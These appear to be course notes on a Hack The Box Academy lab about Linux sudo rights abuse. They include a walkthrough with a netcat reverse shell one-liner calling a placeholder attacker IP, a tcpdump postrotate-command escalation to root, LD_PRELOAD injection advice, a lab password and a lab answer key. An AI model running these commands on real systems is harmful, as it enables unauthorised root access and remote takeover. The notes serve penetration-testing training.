# Sudo Rights Abuse

## ID
702

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 9 — Sudo Rights Abuse

## Description
Covers enumerating sudo privileges with `sudo -l` and abusing misconfigured NOPASSWD entries (e.g., tcpdump postrotate-command) to escalate to root.

## Tags
sudo, nopasswd, privilege-escalation, tcpdump, openssl, gtfobins

## Commands
- `sudo -l`
- `sudo /usr/sbin/tcpdump -ln -i <IFACE> -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root`
- `sudo /usr/bin/openssl`

## What This Section Covers
When administrators grant users sudo access to specific binaries (especially with NOPASSWD), those binaries become privesc vectors if they have escape features or can be abused to read/write files. The section demonstrates the tcpdump `-z postrotate-command` technique as a worked example — any binary allowed via sudo should be checked against GTFOBins for similar abuse patterns.

## Methodology
1. Run `sudo -l` to list what the current user can execute as root.
2. Note any `NOPASSWD` entries — these don't require the user's password.
3. Note any `env_keep` entries (e.g., `LD_PRELOAD`) — these can enable shared library injection.
4. Cross-reference allowed binaries against GTFOBins under the "Sudo" section.
5. Exploit the allowed binary using the appropriate GTFOBins technique.

## Multi-step Workflow (optional)
```
# tcpdump postrotate-command privesc (from section walkthrough)
# 1. Create a reverse shell script
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 443 >/tmp/f' > /tmp/.test
chmod +x /tmp/.test

# 2. Start listener on attacker box
nc -lnvp 443

# 3. Run tcpdump with postrotate-command as root
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
# → root shell on listener
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Command htb-student can run as root | /usr/bin/openssl | `sudo -l` shows `(root) NOPASSWD: /usr/bin/openssl` |

## Step-by-Step Walkthrough

### Setup
```
ssh htb-student@<TARGET_IP>
# password: Academy_LLPE!
```

```
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.119.156

The authenticity of host '10.129.119.156 (10.129.119.156)' can't be established.
ECDSA key fingerprint is SHA256:jqHwbeBBQLd/z1BFRM732tTqQbhKGni0KhrGMszsiVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.119.156' (ECDSA) to the list of known hosts.
htb-student@10.129.119.156's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

<SNIP>

htb-student@NIX02:~$
```

### Q1 — What command can htb-student run as root?
```
sudo -l
```

```
htb-student@NIX02:~/shared_obj_hijack$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```

Answer: `/usr/bin/openssl`

## Key Takeaways
- `sudo -l` is one of the first commands to run on any Linux box — it's fast and frequently reveals the intended privesc path.
- `NOPASSWD` means no password prompt, making exploitation seamless.
- `env_keep+=LD_PRELOAD` in sudo defaults is a critical misconfiguration — you can compile a malicious shared library that spawns a shell and have it loaded by any sudo-allowed command.
- Even "safe-looking" binaries like `openssl` can be abused via sudo — GTFOBins shows how to use `openssl` for file read/write as root.
- The tcpdump `-z postrotate-command` technique is a classic example: any binary that can invoke external commands is dangerous when run as root.
- Two defensive best practices from the section: always specify absolute paths in sudoers entries (prevents PATH abuse), and grant sudo rights based on least privilege.

## Gotchas
- `sudo -l` may itself require a password. If it does, use the user's known password (in this lab: `Academy_LLPE!`).
- Don't overlook the `env_keep` line in `sudo -l` output — it's easy to fixate on the allowed command and miss that `LD_PRELOAD` is preserved, which is often the more powerful vector.
- AppArmor on newer distros blocks the tcpdump postrotate-command trick by restricting which commands can be invoked — the technique still works on older/unprotected systems.
